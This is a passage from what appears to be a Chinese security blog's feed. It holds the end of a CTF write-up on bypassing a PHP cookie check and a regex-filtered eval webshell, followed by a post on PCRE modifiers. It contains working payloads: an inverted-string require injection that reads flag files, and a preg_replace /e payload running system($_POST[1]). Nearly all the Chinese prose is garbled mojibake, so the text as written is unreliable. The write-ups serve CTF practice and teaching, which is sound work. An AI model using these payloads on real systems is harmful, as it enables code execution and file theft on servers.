$shell_path&quot;;</code>æ“ä½œ</p><p>ç¬¬ä¸€ä¸ªä¸‰ç›®è¿ç®—ç¬¦å¤„å¯ä»¥è®¾ç½®ä¸€ä¸ªåä¸º<code>secret</code>çš„<code>cookie</code>ï¼Œå¦‚æœæœªè®¾ç½®çš„è¯ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å¸®ä½ è®¾ç½®ï¼Œéšåè®¾ç½®çš„<code>cookie</code>ï¼Œ<code>secret</code>èµ‹å€¼ç»™<code>$json</code>ï¼Œè¿›å…¥<code>checkCookie</code>å‡½æ•°ï¼Œè§‚å¯Ÿå‡½æ•°å¯å¾—çŸ¥<code>$json</code>ä¸­çš„æ ¼å¼éœ€è¦æ»¡è¶³ä¸€ä¸ª<code>json</code>çš„æ ¼å¼ï¼Œä¸”<code>json</code>ä¸­<code>secret</code>å€¼çš„æ ¼å¼éœ€æ»¡è¶³<code>&#39;/^[\&quot;0-9A-Z]*&#125;$/&#39;</code>ï¼Œç„¶åæ‰èƒ½è¿”å›<code>true</code>ï¼Œè¿›å…¥<code>json_decode</code>ï¼Œå°†<code>secret</code>çš„å€¼è§£æå‡ºæ¥ï¼Œå¦åˆ™<code>die(&#39;no&#39;);</code>ï¼Œäºæ˜¯æˆ‘ä»¬å…ˆä¼ å…¥ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„<code>secret</code>cookieï¼Œçœ‹çœ‹<code>haveFun($flag)</code>å‡½æ•°è¿”å›ä»€ä¹ˆï¼Œå‘åŒ…åå‘ç°è¿”å›è¿™æ ·çš„ä¸€ä¸ªå­—ç¬¦ä¸²0006464640064064646464006406464064640064006400000000000ï¼Œä¸º<code>$flag</code>ç»è¿‡<code>haveFun</code>å‡½æ•°åè¿”å›çš„å€¼ï¼Œè§‚å¯Ÿå‡½æ•°ï¼Œå…¶ä¸­å¯¹<code>$flag</code>è¿›è¡Œäº†md5åŠ å¯†åï¼Œå¯¹å…¶ä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½ç»è¿‡<code>ord</code>å‡½æ•°ä¸<code>0xC0</code>ç»è¿‡äº†ä¸è¿ç®—</p><p>æµ‹è¯•åå‘ç°ï¼Œå¦‚æœæ˜¯æ•°å­—å’Œ<code>0xC0</code>æ¥<code>&amp;</code>ç»“æœå°±æ˜¯0ï¼Œå¦‚æœæ˜¯å­—æ¯åˆ™ç»“æœæ˜¯64ï¼Œé‚£ä¹ˆåˆ™å¯ä»¥ç¡®å®š<code>$flag</code>çš„å‰ä¸‰ä½ä¸ºæ•°å­—ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å› ä¸º<code>$obj[&#39;secret&#39;] != $flag_md5</code>æ­¤å¤„ä¸ºå¼±æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©<code>$obj[&#39;secret&#39;]</code>ï¼Œï¼ˆä¹Ÿå°±æ˜¯ä¼ å…¥cookieä¸­ secret å€¼ä¸­çš„secretçš„å€¼ï¼‰å‰ä¸‰ä½å’Œ<code>$flag_md5</code>çš„å‰ä¸‰ä½æ•°å­—ç›¸ç­‰å³å¯ï¼Œäºæ˜¯æ”¾åˆ°burpä¸­çˆ†ç ´ï¼Œå¾—åˆ°<code>secret=&#123;&quot;secret&quot;:115&#125;</code>ï¼Œéšåå¾—åˆ°<code>$shell_path</code>ä¿¡æ¯ï¼š <code>here is your webshell: w3b5HeLLlll123.php</code></p><p>è®¿é—®<code>w3b5HeLLlll123.php</code>å¾—åˆ°æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//there are some secret waf that you will never know, fuzz me if you can</span><span class="token keyword">require</span> <span class="token string double-quoted-string">"hidden_filter.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;script>location.href=\'./index.php\'&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$secret_waf</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//æ¸…ç©ºsession ä»å¤´å†æ¥</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$_SESSION["</span> <span class="token operator">.</span> <span class="token variable">$code</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"]=false;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember â€¦ we are legion! *  â€”â€”â€”â€”Deep CTF 2020*/</span></span></code></pre><p>å‘ç°<code>eval</code>å‡½æ•°ï¼Œäºæ˜¯ä¼ å…¥codeï¼Œä½†æ˜¯ç»è¿‡äº†<code>preg_match</code>ï¼Œå¹¶ä¸”<code>$secret_waf</code>æ²¡ç»™å‡ºæ¥ï¼Œfuzzæµ‹è¯•åå‘ç°è¿‡æ»¤äº†å¤§å¤šæ•°å­—ç¬¦ï¼Œæ‹¬å·ã€å¼•å·ã€åˆ†å·ã€ç©ºæ ¼ ã€åå¼•å·ã€/ \ $ * # ^ &amp;ç­‰ç¬¦å·ï¼Œå¹¶ä¸”fã€sysã€includeä¹Ÿè¢«è¿‡æ»¤ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºpayloadï¼š<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p><ul><li><code>]=1?&gt;</code>é—­åˆå‰é¢çš„ä¸­æ‹¬å·å’Œphpä»£ç ï¼Œéšåæ‰§è¡Œä¸€å¥è¯phpä»£ç </li><li>~ä¸ºåè½¬å­—ç¬¦ä¸²æ ¹æ®æºç æç¤ºè¯»å–<code>/flag.txt</code></li><li>ä½¿ç”¨<code>require</code>å¯ä»¥ä¸éœ€è¦æ‹¬å·</li><li><code>require</code>å’Œ<code>~</code>ä¹‹é—´ä¸éœ€è¦ç©ºæ ¼å°±å¯ä»¥æ‰§è¡Œ</li></ul><p>å¾—åˆ°<code>flag.txt</code>å†…å®¹ï¼š</p><pre class="language-none"><code class="language-none">å¯ä»¥ï¼Œè¯´æ˜ä½ ctfshowçš„çº¢åŒ…2æ²¡ç™½åšï¼Œflagåœ¨&#x2F;flagï¼ŒåŒæ ·çš„æ–¹æ³•å»è¯»å–å§ã€‚1]&#x3D;false;</code></pre><p>å†è¯»<code>/flag</code>ï¼š<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code>å¾—åˆ°<code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> CTFé¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpæ­£åˆ™è¡¨è¾¾å¼(PCRE)æ¨¡å¼ä¿®é¥°ç¬¦</title>
      <link href="posts/57833c1a/"/>
      <url>posts/57833c1a/</url>
      
        <content type="html"><![CDATA[<p>phpå•åŒå¼•å·çš„åŒºåˆ«ï¼š</p><p>å•å¼•å·ï¼šphpä¸ä¼šè¯»å–é‡Œé¢çš„å˜é‡ï¼Œä½œä¸ºçº¯å­—ç¬¦ä¸²å¤„ç†</p><p>åŒå¼•å·ï¼šPHPä¼šå°è¯•è¯»å–é‡Œé¢çš„å˜é‡ï¼Œæˆ–è€…åæ–œæ è¡¨ç¤ºçš„ç‰¹æ®Šç¬¦å·ï¼Œä¾‹å¦‚<code>\n</code>ï¼Œ<code>\0</code>ç­‰</p><p>å¤„ç†å­—ç¬¦ä¸²å˜é‡æ›¿æ¢çš„è¿æ¥é€Ÿåº¦æ–¹é¢ï¼Œphp7å‰å•å¼•å·ä¼šå¿«äº›ï¼Œè€Œåœ¨php7ä¹‹åå°±æ²¡åŒºåˆ«äº†ï¼Œ<a href="https://www.laruence.com/2008/08/19/338.html">è¯¦è§</a></p><span id="more"></span><h3 id="i-PCRE-CASELESS"><a href="#i-PCRE-CASELESS" class="headerlink" title="i (PCRE_CASELESS)"></a><strong>i (PCRE_CASELESS)</strong></h3><p>ä½¿å¾—æ¨¡å¼å¤§å°å†™ä¸æ•æ„Ÿ</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å­—æ¯ä¼šè¿›è¡Œå¤§å°å†™ä¸æ•æ„ŸåŒ¹é…ã€‚å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519183504562.png" alt loading="lazy"></p><h3 id="m-PCRE-MULTILINE"><a href="#m-PCRE-MULTILINE" class="headerlink" title="m (PCRE_MULTILINE)"></a><strong>m (PCRE_MULTILINE)</strong></h3><p>ä½¿å¾—æ¨¡å¼åŒ¹é…ä¸Šä»»æ„è¡Œä¹‹åå°±è¿”å›true</p><p>é»˜è®¤æƒ…ä¸‹ï¼ŒPCREè®¤ä¸ºç›®æ ‡å­—ç¬¦ä¸²æ˜¯ç”±å•è¡Œå­—ç¬¦ç»„æˆçš„<strong>(ç„¶è€Œå®é™…ä¸Šå¯èƒ½ä¼šåŒ…å«å¤šè¡Œ)</strong>ï¼Œâ€è¡Œé¦–â€œå…ƒå­—ç¬¦<code>(^)</code>ä»…åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ï¼Œè€Œâ€è¡Œæœ«â€œå…ƒå­—ç¬¦<code>($)</code>ä»…åŒ¹é…å­—ç¬¦ä¸²æœ«å°¾ï¼Œæˆ–è€…æœ€åçš„æ¢è¡Œç¬¦<strong>(é™¤éè®¾ç½®äº†Dä¿®é¥°ç¬¦)</strong>ã€‚ä½†ä¹Ÿä»…ä»…æ˜¯è¡Œé¦–è¡Œæœ«ï¼Œå½“è¿™ä¸ªä¿®é¥°ç¬¦è®¾ç½®åï¼Œâ€œè¡Œé¦–â€å’Œâ€œè¡Œæœ«â€å°±ä¼šåŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²ä¸­ä»»æ„æ¢è¡Œç¬¦ä¹‹å‰æˆ–ä¹‹åï¼Œå¦å¤–ï¼Œè¿˜åˆ†åˆ«åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„æœ€å¼€å§‹å’Œæœ€æœ«å°¾ä½ç½®ï¼Œå½“æˆ‘ä»¬åœ¨å¾…åŒ¹é…çš„<code>subject</code>å¤„ä¼ å…¥ä¸€ä¸ªæ¢è¡Œç¬¦<strong>(å³%0a)</strong>çš„æ—¶å€™ï¼Œæ¢è¡Œç¬¦å‰çš„åŒ¹é…ä¸Šåï¼Œå³ä½¿åé¢çš„åŒ¹é…ä¸ä¸Šï¼Œè¡¨è¾¾å¼ä¼šè¿”å›1ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519220256656.png" alt loading="lazy"></p><p>å¦‚æœ<code>/m</code>ä½¿ç”¨ä¸å½“å°±ä¼šå­˜åœ¨æ¼æ´ä»è€Œç»•è¿‡æŸäº›é™åˆ¶</p><h3 id="s-PCRE-DOTALL"><a href="#s-PCRE-DOTALL" class="headerlink" title="s (PCRE_DOTALL)"></a><strong>s (PCRE_DOTALL)</strong></h3><p>ä½¿å¾—<code>.</code>å¯ä»¥åŒ¹é…æ¢è¡Œç¬¦</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„ç‚¹å·<code>(.)</code>å­—ç¬¦åŒ¹é…æ‰€æœ‰çš„å­—ç¬¦ï¼Œ<strong>åŒ…å«æ¢è¡Œç¬¦</strong>ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œç‚¹å·ä¸åŒ¹é…æ¢è¡Œç¬¦ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519221410216.png" alt loading="lazy"></p><h3 id="D-PCRE-DOLLAR-ENDONLY"><a href="#D-PCRE-DOLLAR-ENDONLY" class="headerlink" title="D (PCRE_DOLLAR_ENDONLY)"></a><strong>D (PCRE_DOLLAR_ENDONLY)</strong></h3><p>ä½¿å¾—<code>$</code>ä¸åŒ¹é…æ¢è¡Œç¬¦</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å…ƒå­—ç¬¦ç¾å…ƒç¬¦å·<code>($)</code>ï¼Œä»…ä»…åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œå¦‚æœè¿™ä¸ªä¿®é¥°ç¬¦æ²¡æœ‰è®¾ç½®ï¼Œå½“å­—ç¬¦ä¸²ä»¥ä¸€ä¸ªæ¢è¡Œç¬¦ç»“å°¾æ—¶ï¼Œç¾å…ƒç¬¦å·è¿˜ä¼šåŒ¹é…è¯¥æ¢è¡Œç¬¦<strong>(ä½†ä¸ä¼šåŒ¹é…ä¹‹å‰çš„ä»»ä½•æ¢è¡Œç¬¦)</strong>ï¼Œå¦‚æœè®¾ç½®äº†ä¿®é¥°ç¬¦<em>m</em>ï¼Œè¿™ä¸ªä¿®é¥°ç¬¦è¢«å¿½ç•¥ã€‚å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520165220099.png" alt loading="lazy"></p><h3 id="x-PCRE-EXTENDED"><a href="#x-PCRE-EXTENDED" class="headerlink" title="x (PCRE_EXTENDED)"></a><strong>x (PCRE_EXTENDED)</strong></h3><p>ä½¿å¾—å¯ä»¥åœ¨æ¨¡å¼ä¸­æ·»åŠ æ³¨é‡Š</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„æ²¡æœ‰ç»è¿‡è½¬ä¹‰çš„æˆ–ä¸åœ¨å­—ç¬¦ç±»ä¸­çš„ç©ºç™½æ•°æ®å­—ç¬¦æ€»ä¼šè¢«å¿½ç•¥ï¼Œå¹¶ä¸”ä½äºä¸€ä¸ªæœªè½¬ä¹‰çš„å­—ç¬¦ç±»å¤–éƒ¨çš„#å­—ç¬¦å’Œä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹é—´çš„å­—ç¬¦ä¹Ÿè¢«å¿½ç•¥ã€‚æ³¨æ„ï¼šè¿™ä»…ç”¨äºæ•°æ®å­—ç¬¦ã€‚ ç©ºç™½å­—ç¬¦è¿˜æ˜¯ä¸èƒ½åœ¨æ¨¡å¼çš„ç‰¹æ®Šå­—ç¬¦åºåˆ—ä¸­å‡ºç°ã€‚å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520171421233.png" alt loading="lazy"></p><h3 id="e-PREG-REPLACE-EVAL"><a href="#e-PREG-REPLACE-EVAL" class="headerlink" title="e (PREG_REPLACE_EVAL)"></a><strong>e (PREG_REPLACE_EVAL)</strong></h3><p>è¿™ä¸ªåŠŸèƒ½åœ¨php5.5.0ä¸­å·²å¼ƒç”¨ï¼Œåœ¨php7.0.0ä¸­å·²åˆ é™¤</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªè¢«å¼ƒç”¨çš„ä¿®é¥°ç¬¦ï¼Œ<a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a> åœ¨è¿›è¡Œäº†å¯¹æ›¿æ¢å­—ç¬¦ä¸²çš„åå‘å¼•ç”¨æ›¿æ¢ä¹‹å, å°†æ›¿æ¢åçš„å­—ç¬¦ä¸²ä½œä¸º<code>php</code>ä»£ç è¯„ä¼°æ‰§è¡Œ(<code>eval</code>å‡½æ•°æ–¹å¼)ï¼Œå¹¶ä½¿ç”¨æ‰§è¡Œç»“æœ ä½œä¸ºå®é™…å‚ä¸æ›¿æ¢çš„å­—ç¬¦ä¸²ã€‚å•å¼•å·ã€åŒå¼•å·ã€åæ–œçº¿<code>(\)</code>å’Œ NULL å­—ç¬¦åœ¨åå‘å¼•ç”¨æ›¿æ¢æ—¶ä¼šè¢«ç”¨åæ–œçº¿è½¬ä¹‰ã€‚ä»¥ä¸‹æ˜¯å…¸å‹çš„ä¸€ç§åˆ©ç”¨æ–¹æ³•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520173908256.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520174020072.png" alt loading="lazy"></p><p>è™½ç„¶ä¼ å…¥å¼•å·ä¼šè¢«è½¬ä¹‰ï¼Œä½†æ˜¯è¿™å¹¶ä¸ä¼šå½±å“æˆ‘ä»¬<code>getshell</code>ï¼Œä»¤ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º<code>&#123;$&#123;system($_POST[1])&#125;&#125;</code>å³å¯<code>POST</code>å‘½ä»¤æ‰§è¡Œå‚æ•°ï¼Œè¿™é‡Œæ³¨æ„éœ€è¦åŒ¹é…åˆ°<code>$&#123;&#125;</code>è¿™ç§ç±»ä¼¼çš„ç¬¦å·åŒ…è£¹ç€ä»£ç çš„æ‰èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ˜¯å› ä¸º<a href="http://php.net/manual/zh/language.variables.variable.php">PHPå¯å˜å˜é‡</a>çš„åŸå› ï¼Œ<code>$&#123;&#125;</code>ä¸­åŒ…è£¹çš„å­—ç¬¦åˆ™ä¼šå½“åšä»£ç æ‰§è¡Œ</p><h3 id="A-PCRE-ANCHORED"><a href="#A-PCRE-ANCHORED" class="headerlink" title="A (PCRE_ANCHORED)"></a><strong>A (PCRE_ANCHORED)</strong></h3><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼è¢«å¼ºåˆ¶ä¸ºâ€é”šå®šâ€æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´çº¦æŸåŒ¹é…ä½¿å…¶ä»…ä» ç›®æ ‡å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®æœç´¢ã€‚è¿™ä¸ªæ•ˆæœåŒæ ·å¯ä»¥ä½¿ç”¨é€‚å½“çš„æ¨¡å¼æ„é€ å‡ºæ¥(å¦‚ï¼š<code>^</code>)ã€‚ç®€å•æ¥è®²å°±æ˜¯è¡¨è¾¾å¼å¿…é¡»æ˜¯åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„å¼€å¤´éƒ¨åˆ†</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520175528269.png" alt loading="lazy"></p><h3 id="U-PCRE-UNGREEDY"><a href="#U-PCRE-UNGREEDY" class="headerlink" title="U(PCRE_UNGREEDY)"></a><strong>U(PCRE_UNGREEDY)</strong></h3><p>è¿™ä¸ªä¿®é¥°ç¬¦é€†è½¬äº†é‡è¯çš„â€è´ªå©ªâ€æ¨¡å¼ã€‚ å¦‚æœä½¿ç”¨è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œä¼šä½¿é‡è¯é»˜è®¤ä¸ºéè´ªå©ªçš„ï¼Œé€šè¿‡é‡è¯åç´§è·Ÿ<code>?</code>çš„æ–¹å¼å¯ä»¥ä½¿å…¶æˆä¸ºè´ªå©ªçš„ã€‚é€†è½¬è´ªå©ªåŠŸèƒ½</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/phpæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¿®é¥°ç¬¦/image-20200520182001826.png" style="zoom: 67%;" loading="lazy"><h3 id="X-PCRE-EXTRA"><a href="#X-PCRE-EXTRA" class="headerlink" title="X(PCRE_EXTRA)"></a><strong>X(PCRE_EXTRA)</strong></h3><p>è¿™ä¸ªä¿®é¥°ç¬¦æ‰“å¼€äº† PCRE ä¸ perl ä¸å…¼å®¹çš„é™„ä»¶åŠŸèƒ½ã€‚æ¨¡å¼ä¸­çš„ä»»æ„åæ–œçº¿åå°± ingen ä¸€ä¸ª æ²¡æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦éƒ½ä¼šå¯¼è‡´ä¸€ä¸ªé”™è¯¯ï¼Œä»¥æ­¤ä¿ç•™è¿™äº›å­—ç¬¦ä»¥ä¿è¯å‘åå…¼å®¹æ€§ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨ perl ä¸­ï¼Œåæ–œçº¿ç´§è·Ÿä¸€ä¸ªæ²¡æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦è¢«è®¤ä¸ºæ˜¯è¯¥å­—ç¬¦çš„åŸæ–‡ã€‚ å½“å‰æ²¡æœ‰å…¶ä»–ç‰¹æ€§ç”±è¿™ä¸ªä¿®é¥°ç¬¦æ§åˆ¶ã€‚</p><h3 id="J-PCRE-INFO-JCHANGED"><a href="#J-PCRE-INFO-JCHANGED" class="headerlink" title="J(PCRE_INFO_JCHANGED)"></a><strong>J(PCRE_INFO_JCHANGED)</strong></h3><p>å†…éƒ¨é€‰é¡¹è®¾ç½®<code>(?J)</code>ä¿®æ”¹æœ¬åœ°çš„<em>PCRE_DUPNAMES</em>é€‰é¡¹ã€‚å…è®¸å­ç»„é‡åã€‚ (è¯‘æ³¨ï¼šåªèƒ½é€šè¿‡å†…éƒ¨é€‰é¡¹è®¾ç½®ï¼Œå¤–éƒ¨çš„ <code>/J</code> è®¾ç½®ä¼šäº§ç”Ÿé”™è¯¯ã€‚)</p><h3 id="u-PCRE-UTF8"><a href="#u-PCRE-UTF8" class="headerlink" title="u(PCRE_UTF8)"></a><strong>u(PCRE_UTF8)</strong></h3><p>æ­¤ä¿®æ­£ç¬¦æ‰“å¼€ä¸€ä¸ªä¸ <code>perl</code> ä¸å…¼å®¹çš„é™„åŠ åŠŸèƒ½ã€‚æ¨¡å¼å’Œç›®æ ‡å­—ç¬¦ä¸²éƒ½è¢«è®¤ä¸ºæ˜¯<code>utf-8</code>çš„ã€‚ æ— æ•ˆçš„ç›®æ ‡å­—ç¬¦ä¸²ä¼šå¯¼è‡´ <code>preg_*</code> å‡½æ•°ä»€ä¹ˆéƒ½åŒ¹é…ä¸åˆ°ï¼› æ— æ•ˆçš„æ¨¡å¼å­—ç¬¦ä¸²ä¼šå¯¼è‡´ <code>E_WARNING</code> çº§åˆ«çš„é”™è¯¯ã€‚PHP5.3.4 åï¼Œ5å­—èŠ‚å’Œ6å­—èŠ‚çš„ UTF-8 å­—ç¬¦åºåˆ—è¢«è€ƒè™‘ä¸ºæ— æ•ˆ<code>(resp. PCRE 7.3 2007-08-28)</code>ã€‚ ä»¥å‰å°±è¢«è®¤ä¸ºæ˜¯æ— æ•ˆçš„ UTF-8ã€‚</p><h3 id="S"><a href="#S" class="headerlink" title="S"></a><strong>S</strong></h3><p>å½“ä¸€ä¸ªæ¨¡å¼éœ€è¦å¤šæ¬¡ä½¿ç”¨çš„æ—¶å€™ï¼Œä¸ºäº†å¾—åˆ°åŒ¹é…é€Ÿåº¦çš„æå‡ï¼Œå€¼å¾—èŠ±è´¹ä¸€äº›æ—¶é—´ å¯¹å…¶è¿›è¡Œä¸€äº›é¢å¤–çš„åˆ†æã€‚å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œè¿™ä¸ªé¢å¤–çš„åˆ†æå°±ä¼šæ‰§è¡Œã€‚å½“å‰ï¼Œ è¿™ç§å¯¹ä¸€ä¸ªæ¨¡å¼çš„åˆ†æä»…ä»…é€‚ç”¨äºéé”šå®šæ¨¡å¼çš„åŒ¹é…(å³æ²¡æœ‰å•ç‹¬çš„å›ºå®šå¼€å§‹å­—ç¬¦)ã€‚</p><h3 id="åŒ¹é…æ¢è¡Œé—®é¢˜"><a href="#åŒ¹é…æ¢è¡Œé—®é¢˜" class="headerlink" title="$åŒ¹é…æ¢è¡Œé—®é¢˜"></a><strong>$åŒ¹é…æ¢è¡Œé—®é¢˜</strong></h3><p>åœ¨å¤šè¡Œæ¨¡å¼ä¸‹ï¼Œå› ä¸ºæ˜¯å¤šè¡Œæ¨¡å¼ï¼Œæ‰€ä»¥<code>$</code>å¯ä»¥åŒ¹é…æ¯ä¸€è¡Œçš„ç»“å°¾ï¼Œä¸”ä¸ä¼šåŒ¹é…æ¢è¡Œç¬¦</p><p>åœ¨å•è¡Œæ¨¡å¼ä¸‹ï¼Œå°†æ•´ä¸ªæ–‡æœ¬è§†ä¸ºä¸€è¡Œï¼Œæ‰€ä»¥<code>$</code>åŒ¹é…çš„æ˜¯æ–‡æœ¬çš„ç»“å°¾ï¼Œä¸”åŒ…æ‹¬ç»“å°¾çš„æ¢è¡Œç¬¦</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520163746726.png" alt loading="lazy"></p><p>ä¾‹å¦‚Apacheçš„æ¢è¡Œè§£ææ¼æ´ï¼Œå› ä¸º<code>$</code>èƒ½åŒ¹é…<code>\n</code>ï¼Œæ‰€ä»¥ä¸Šä¼ 